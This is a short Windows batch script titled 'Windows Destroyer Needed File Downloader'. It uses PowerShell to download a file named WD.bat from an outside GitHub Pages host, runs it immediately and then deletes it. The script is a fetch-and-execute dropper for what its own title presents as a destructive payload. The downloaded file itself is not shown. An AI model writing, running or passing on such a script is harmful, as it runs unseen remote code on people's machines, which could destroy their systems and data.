@echo off
title Windows Destroyer Needed File Downloader
if exist logo.bat call logo.bat & echo.
echo Downloading needed files..
echo ==========================
if not exist WD.bat echo Downloading WD.bat..
if not exist WD.bat powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://schooicodes.github.io/file_hosting/WD.bat -outfile WD.bat"
echo Done.
call WD.bat
del WD.bat >nul
exit